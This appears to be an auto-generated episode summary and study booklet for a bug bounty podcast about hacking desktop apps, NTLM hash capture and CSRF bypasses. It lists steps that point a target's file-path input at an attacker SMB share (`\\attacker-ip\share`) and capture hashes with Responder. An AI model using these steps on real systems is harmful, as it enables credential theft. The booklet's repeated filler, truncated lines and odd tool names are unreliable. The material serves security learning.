---
title: "H1-407 Event Madness & Takeaways Part 2 w/ Special Guest Spaceraccoon"
episode: 4
---


# Episode 4 H1-407 Event Madness & Takeaways Part 2 w/ Special Guest Spaceraccoon

### TL;DR
- Binary exploitation at live hacking events: desktop/binary targets are under-audited
- Moving from web to binary: levels of abstraction (scripting → C#/Java → assembly)
- Writing binary exploit reports: script POC (PowerShell/Python) that pops debugger to show overwrite
- UNC path injection + Responder to capture NTLM hashes
- JSON nested object representation in x-www-form-urlencoded for CSRF
- Space Raccoon's process: nights/weekends hacking, collaboration across timezones
- OSCP/OSED training for binary exploitation skills

### Key takeaways
- Desktop/binary apps in bug bounty are under-audited — big opportunity
- Reverse engineering levels: scripting languages (easiest) → C#/Java (intermediate) → assembly/hard (native compiled)
- For memory corruption exploits: script POC so triagers can reproduce easily
- UNC path injection + Responder = NTLM hash capture
- Convert JSON payloads to x-www-form-urlencoded for CSRF by using square bracket syntax for nested objects
- Use `<meta name="referrer" content="unsafe-url">` to force full URL leak cross-origin for CSRF referer bypass
- Offensive Security courses (OSCP/OSED) provide structured binary exploitation training

### Bugs and Findings

#### Responder + UNC Path Injection — NTLM Hash Leak
- **Target/context:** Desktop application accepting user input that reaches a file path (UNC)
- **Root cause:** User input injected into a UNC path; Windows tries to authenticate to the attacker's SMB server
- **Technique / how found:** Friend had a UNC path injection, couldn't escalate; Justin suggested Responder
- **Exploitation steps:**
  1. Find input that gets used as a file path
  2. Make it point to attacker's SMB server (`\\attacker-ip\share`)
  3. Spin up Responder on attacker server
  4. Target's Windows sends NTLMv2 hash automatically during SMB auth
- **Key technical details:** UNC path `\\<attacker>\share`; Responder captures NTLMv2 hash
- **Impact / severity / bounty:** NTLM hash leak (confidentiality); can be cracked or relayed
- **Obstacles & how solved:** [inferred] Outbound SMB may need to be allowed

#### JSON → x-www-form-urlencoded CSRF Bypass
- **Target/context:** Web application expecting JSON but accepting form-encoded
- **Root cause:** Application accepts x-www-form-urlencoded data but also parses nested objects using square bracket notation
- **Technique / how found:** Known CSRF vector; Justin was doing it wrong (not properly nesting with `[]`)
- **Key technical details:** `param[key]=value` → parsed as nested object on server; `param[key][subkey]=value` for deeper nesting

### Techniques and Primitives
- **Binary exploitation report writing** — script POC (PowerShell/Python) that automates the reproduction; include Windbg CLI commands
- **Responder for NTLM capture** — from UNC injection, spin up Responder to capture NTLM hashes
- **JSON→form-encoded CSRF** — use `[]` syntax in x-www-form-urlencoded to represent nested objects; try all content types (JSON, text/plain, form-encoded)
- **Meta referrer tag bypass** — `<meta name="referrer" content="unsafe-url">` to leak full URL cross-origin

### Tooling and Resources
- Responder (for NTLM hash capture)
- dotPeek (JetBrains .NET decompiler)
- Offensive Security: OSCP, OSED (binary exploitation certification)
- JADX GUI
- Cyclic.sh / Kerbro.sh (for NTLM relaying, implied)

### Suggestions and Advices from Hunter
- "Not a lot of people are looking at desktop applications right now" — Space Raccoon on under-audited scope
- "Once I was really confident in understanding what I was supposed to be doing, I became a lot more confident" — Space Raccoon on binary exploitation training
- "Just read the docs" — recurring theme: how features are *supposed* to work vs how they actually work
- "Frame it in terms of impact, not CVSS" — on NTLM leak reports

### AI Takeaway
UNC path injection + Responder is a portable exploit primitive for Windows desktop apps. The key insight: many apps accept user input that eventually reaches file system paths, and Windows auto-authenticates to SMB servers. This turns file-path injection into credential leak.
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
Binary exploitation at live hacking events: desktop/binary targets are under-audited

#### 2. What you should learn
- Understand **desktop/binary apps in bug bounty are under-audited — big opportunity**
- Understand **reverse engineering levels: scripting languages (easiest) → c#/java (intermediate) → assembly/hard (native compiled)**
- Understand **for memory corruption exploits: script poc so triagers can reproduce easily**
- Understand **unc path injection + responder = ntlm hash capture**
- Understand **convert json payloads to x-www-form-urlencoded for csrf by using square bracket syntax for nested objects**

#### 3. Core concepts explained
**Responder + UNC Path Injection — NTLM Hash Leak**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**JSON → x-www-form-urlencoded CSRF Bypass**
- **What it is:** Cross-Site Request Forgery — tricking a victim's browser into making unwanted requests to a site where they're authenticated.
- **Why it matters:** CSRF can change email, password, or perform actions on behalf of the victim.
- **Common mistake:** Only testing GET-based CSRF — POST and PUT endpoints with CSRF tokens may still be vulnerable if tokens are predictable.

**Binary exploitation report writing**
- script POC (PowerShell/Python) that automates the reproduction; include Windbg CLI commands

**Responder for NTLM capture**
- from UNC injection, spin up Responder to capture NTLM hashes

**JSON→form-encoded CSRF**
- use `[]` syntax in x-www-form-urlencoded to represent nested objects; try all content types (JSON, text/plain, form-encoded)


#### 4. Techniques and tactics
**Binary exploitation report writing**
- **What it is:** script POC (PowerShell/Python) that automates the reproduction; include Windbg CLI commands
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Responder for NTLM capture**
- **What it is:** from UNC injection, spin up Responder to capture NTLM hashes
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**JSON→form-encoded CSRF**
- **What it is:** use `[]` syntax in x-www-form-urlencoded to represent nested objects; try all content types (JSON, text/plain, form-encoded)
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Meta referrer tag bypass**
- **What it is:** `<meta name="referrer" content="unsafe-url">` to leak full URL cross-origin
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.


#### 5. Good Quotes
- *"Not a lot of people are looking at desktop applications right now"* — **Space Raccoon on under-audited scope**
- *"Once I was really confident in understanding what I was supposed to be doing, I became a lot more confident"* — **Space Raccoon on binary exploitation training**
- *"Just read the docs"* — **recurring theme: how features are *supposed* to work vs how they actually work**
- *"Frame it in terms of impact, not CVSS"* — **on NTLM leak reports**

#### 6. Mental models
- **Not a lot of people are looking at desktop applications righ** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **Once I was really confident in understanding what I was supp** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **Just read the docs" — recurring theme: how features are *sup** — This mindset helps you find bugs others miss by approaching the problem from a different angle.

#### 7. Real-world application
- **Try this:** Desktop/binary apps in bug bounty are under-audited — big opportunity
- **Try this:** Reverse engineering levels: scripting languages (easiest) → C#/Java (intermediate) → assembly/hard (native compiled)
- **Try this:** For memory corruption exploits: script POC so triagers can reproduce easily
- **Try this:** UNC path injection + Responder = NTLM hash capture

#### 8. Red flags and pitfalls
- - Obstacles & how solved: [inferred] Outbound SMB may need to be allowed

#### 9. Vocabulary
- **CSRF** — Cross-Site Request Forgery — tricking users into making unwanted requests
- **RCE** — Remote Code Execution — running arbitrary code on a target server

#### 10. Self-test
1. **Recall:** What is the root cause of the vulnerability in Responder + UNC Path Injection — NTLM Hash Leak?
2. **Application:** If you found a similar pattern in a different application, what would your first test be?
3. **Reasoning:** Why is this technique effective against the target? What makes it work?
4. **Application:** How would you adapt this technique if the target had a WAF blocking obvious payloads?
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.

#### 11. The practical takeaway
1. **Binary exploitation at live hacking events: desktop/binary targets are under-aud**
2. **Desktop/binary apps in bug bounty are under-audited — big opportunity**
3. **Reverse engineering levels: scripting languages (easiest) → C#/Java (intermediat**
